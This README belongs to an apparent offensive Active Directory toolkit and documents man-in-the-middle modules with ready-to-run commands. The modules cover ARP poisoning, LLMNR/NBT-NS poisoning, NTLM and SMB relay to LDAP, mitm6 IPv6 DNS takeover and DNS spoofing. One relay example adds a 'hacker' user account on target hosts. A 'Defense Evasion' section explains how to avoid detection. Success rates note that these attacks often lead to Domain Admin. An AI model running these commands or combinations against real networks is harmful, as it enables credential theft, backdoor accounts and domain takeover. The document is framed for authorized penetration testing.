# MITM (Man-in-the-Middle) Attack Directory

## Overview

This directory contains comprehensive Man-in-the-Middle attack modules specifically designed for Active Directory environments. These attacks intercept, manipulate, and relay network traffic to compromise credentials and gain unauthorized access.

---

## ⚠️ WARNING

**These are ACTIVE NETWORK ATTACKS that can disrupt normal operations.**

- Use ONLY in authorized penetration testing engagements
- Obtain written permission before deployment
- Understand potential network impact
- Have incident response plan ready

---

## 📋 Available Modules

### 1. **ARP Poisoning Suite** (`arp_poisoning_suite.py`)

**Purpose**: Classic MITM via ARP cache poisoning

**Capabilities**:

- ARP cache poisoning for traffic interception
- HTTP Basic Auth credential capture
- FTP credential sniffing
- Network traffic analysis
- Graceful cleanup and restoration

**Usage**:

```bash
python3 arp_poisoning_suite.py \
  --session-dir ./sessions/test \
  --target 192.168.1.100 \
  --gateway 192.168.1.1 \
  --interface eth0 \
  --duration 300
```

**Requirements**: Root privileges, Scapy

---

### 2. **Responder - LLMNR/NBT-NS Poisoning** (`responder.py`)

**Purpose**: Poison name resolution protocols to capture NTLM hashes

**Capabilities**:

- LLMNR (Link-Local Multicast Name Resolution) poisoning
- NBT-NS (NetBIOS Name Service) poisoning
- mDNS poisoning
- WPAD rogue proxy attacks
- NTLMv1/v2 hash capture
- Automatic log parsing

**Usage**:

```bash
sudo python3 responder.py \
  --session-dir ./sessions/test \
  --interface eth0 \
  --duration 600
```

**Analyze Mode** (passive, no poisoning):

```bash
sudo python3 responder.py \
  --session-dir ./sessions/test \
  --interface eth0 \
  --analyze
```

**Requirements**: Root, Responder tool

- Install: `git clone https://github.com/lgandx/Responder.git`

**Attack Flow**:

1. Client attempts name resolution (LLMNR/NBT-NS)
2. Responder answers with attacker IP
3. Client connects to attacker
4. Responder forces NTLM authentication
5. NTLMv2 hash captured
6. Hash can be cracked offline

---

### 3. **NTLM Relay** (`ntlm_relay.py`)

**Purpose**: Relay captured NTLM authentication to compromise targets

**Attack Modes**:

#### SMB Relay

```bash
sudo python3 ntlm_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10,192.168.1.20 \
  --mode smb
```

#### HTTP to SMB Relay

```bash
sudo python3 ntlm_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10 \
  --mode http
```

#### IPv6 Relay (with mitm6)

```bash
sudo python3 ntlm_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10 \
  --mode ipv6 \
  --domain victim.local
```

**Command Execution**:

```bash
sudo python3 ntlm_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10 \
  --mode smb \
  --command "net user hacker Password123! /add"
```

**Requirements**: Root, Impacket

- Install: `pip3 install impacket`

**Attack Flow**:

1. Attacker captures NTLM auth (via Responder or other)
2. ntlmrelayx relays auth to target server
3. If SMB signing disabled, relay succeeds
4. Attacker executes commands or dumps credentials

---

### 4. **SMB Relay** (`smb_relay.py`)

**Purpose**: Specialized SMB authentication relay with advanced features

**Attack Modes**:

#### SMB to SMB (Classic)

```bash
sudo python3 smb_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10,192.168.1.20 \
  --mode smb
```

#### SMB to LDAP (Privilege Escalation)

```bash
sudo python3 smb_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10 \
  --mode ldap \
  --dc 192.168.1.5
```

#### SOCKS Proxy Mode

```bash
sudo python3 smb_relay.py \
  --session-dir ./sessions/test \
  --targets 192.168.1.10 \
  --mode socks
```

Then use with proxychains:

```bash
proxychains secretsdump.py 'domain/user@target'
```

**Features**:

- Automatic SMB signing detection
- SAM and LSASS dumping
- LDAP relay for privilege escalation
- SOCKS proxy for interactive access
- Multi-target support

---

### 5. **IPv6 DNS Takeover** (`ipv6_attack.py`)

**Purpose**: Exploit IPv6 to become default DNS server and MITM traffic

**Attack with mitm6**:

```bash
sudo python3 ipv6_attack.py \
  --session-dir ./sessions/test \
  --domain victim.local \
  --interface eth0 \
  --duration 600
```

**With NTLM Relay**:

```bash
sudo python3 ipv6_attack.py \
  --session-dir ./sessions/test \
  --domain victim.local \
  --relay-target 192.168.1.10 \
  --duration 600
```

**Requirements**: Root, mitm6

- Install: `pip3 install mitm6`
- Or: `git clone https://github.com/dirkjanm/mitm6.git && cd mitm6 && pip3 install .`

**Attack Flow**:

1. mitm6 advertises rogue IPv6 DNS via DHCPv6
2. Windows clients auto-configure IPv6
3. Clients use attacker as DNS server
4. Attacker receives WPAD requests
5. Forces NTLM authentication
6. Relays to target servers

**Why Effective**:

- IPv6 enabled by default on Windows
- Takes precedence over IPv4
- Often overlooked by defenders

---

### 6. **DNS Spoofing** (`dns_spoofing.py`)

**Purpose**: Intercept and manipulate DNS traffic

**Spoof Specific Domains**:

```bash
sudo python3 dns_spoofing.py \
  --session-dir ./sessions/test \
  --interface eth0 \
  --attacker-ip 192.168.1.50 \
  --target-domains intranet.victim.local,fileserver.victim.local \
  --duration 300
```

**Spoof All DNS** (dangerous):

```bash
sudo python3 dns_spoofing.py \
  --session-dir ./sessions/test \
  --interface eth0 \
  --attacker-ip 192.168.1.50 \
  --duration 300
```

**Ettercap MITM Mode**:

```bash
sudo python3 dns_spoofing.py \
  --session-dir ./sessions/test \
  --interface eth0 \
  --mode ettercap \
  --ettercap-targets 192.168.1.100,192.168.1.1
```

**Requirements**: Root, Scapy, Ettercap (for Ettercap mode)

---

## 🎯 Attack Combinations

### Combo 1: Responder + NTLM Relay

**Terminal 1** - Start Responder:

```bash
sudo python3 responder.py \
  --session-dir ./sessions/combo1 \
  --interface eth0 \
  --duration 1800
```

**Terminal 2** - Start NTLM Relay:

```bash
sudo python3 ntlm_relay.py \
  --session-dir ./sessions/combo1 \
  --targets 192.168.1.10,192.168.1.20 \
  --mode smb
```

**Result**: Captured hashes automatically relayed and exploited

---

### Combo 2: IPv6 + SMB Relay to LDAP

**Attack Flow**:

```bash
sudo python3 ipv6_attack.py \
  --session-dir ./sessions/combo2 \
  --domain victim.local \
  --relay-target 192.168.1.5 \
  --duration 1800
```

**Result**: Domain privilege escalation via IPv6 MITM + LDAP relay

---

### Combo 3: ARP Poisoning + DNS Spoofing

**Terminal 1** - ARP Poison:

```bash
sudo python3 arp_poisoning_suite.py \
  --session-dir ./sessions/combo3 \
  --target 192.168.1.100 \
  --gateway 192.168.1.1 \
  --interface eth0 \
  --duration 1800
```

**Terminal 2** - DNS Spoof:

```bash
sudo python3 dns_spoofing.py \
  --session-dir ./sessions/combo3 \
  --interface eth0 \
  --attacker-ip 192.168.1.50 \
  --target-domains dc01.victim.local \
  --duration 1800
```

**Result**: Complete traffic control with DNS redirection

---

## 🛡️ Defense Evasion

**Reduce Detection Risk**:

1. **Limit Duration**:

   - Keep attacks short (5-10 minutes)
   - Rotate between different techniques

2. **Selective Targeting**:

   - Target specific domains (not all DNS)
   - Focus on specific hosts

3. **Timing**:

   - Attack during business hours (blends in)
   - Or after-hours (less monitoring)

4. **Cleanup**:
   - All modules include graceful cleanup
   - Restore ARP tables
   - Stop poisoning cleanly

---

## 📊 Expected Results

### Responder

- **Success Rate**: 80-90% in most AD environments
- **Time to First Hash**: 5-30 minutes
- **Typical Yield**: 5-20 NTLMv2 hashes per hour

### NTLM Relay

- **Success Rate**: 60-70% (depends on SMB signing)
- **Impact**: Often leads to Domain Admin
- **Best Targets**: Servers with signing disabled

### IPv6 Attack (mitm6)

- **Success Rate**: 70-80% (IPv6 usually enabled)
- **Time to First Auth**: 10-30 minutes
- **Impact**: High (bypasses most network segmentation)

### SMB Relay to LDAP

- **Success Rate**: 50-60%
- **Impact**: Critical (privilege escalation to DA)
- **Requirements**: Capture admin authentication

---

## 🔧 Prerequisites

**System Requirements**:

- Linux (Kali preferred)
- Root/sudo access
- Network interface in promiscuous mode

**Tools**:

```bash
# Install all dependencies
pip3 install scapy impacket mitm6

# Responder
git clone https://github.com/lgandx/Responder.git

# Optional: Ettercap
apt-get install ettercap-text-only
```

**Network Configuration**:

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Enable IPv6 forwarding (for mitm6)
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding

# Set interface to promiscuous mode
ifconfig eth0 promisc
```

---

## 🎓 Best Practices

1. **Pre-Engagement**:

   - Map network topology
   - Identify targets with SMB signing disabled
   - Test from isolated network first

2. **During Engagement**:

   - Monitor attack effectiveness
   - Log all captures
   - Maintain operational security

3. **Post-Engagement**:

   - Verify cleanup completed
   - Document all compromised credentials
   - Include IOCs in report

4. **Reporting**:
   - Show impact of attacks
   - Recommend mitigations (SMB signing, LLMNR disable)
   - Provide evidence (captured hashes, screenshots)

---

## 🚨 Common Issues

**Issue**: "Permission denied" errors  
**Solution**: Run with `sudo` - all MITM attacks require root

**Issue**: No hashes captured with Responder  
**Solution**:

- Check if LLMNR is enabled on network
- Verify interface is correct
- Wait longer (30-60 minutes)

**Issue**: NTLM relay fails  
**Solution**:

- Check SMB signing status: `nmap --script smb-security-mode`
- Ensure targets are reachable
- Verify Impacket is up-to-date

**Issue**: IPv6 attack not working  
**Solution**:

- Verify IPv6 is enabled on clients
- Check for DHCPv6 support
- Ensure no existing IPv6 DHCP server

---

## License

Same as ADBasher framework - Use responsibly and legally.

---

**Built for professional penetration testers conducting authorized engagements.**
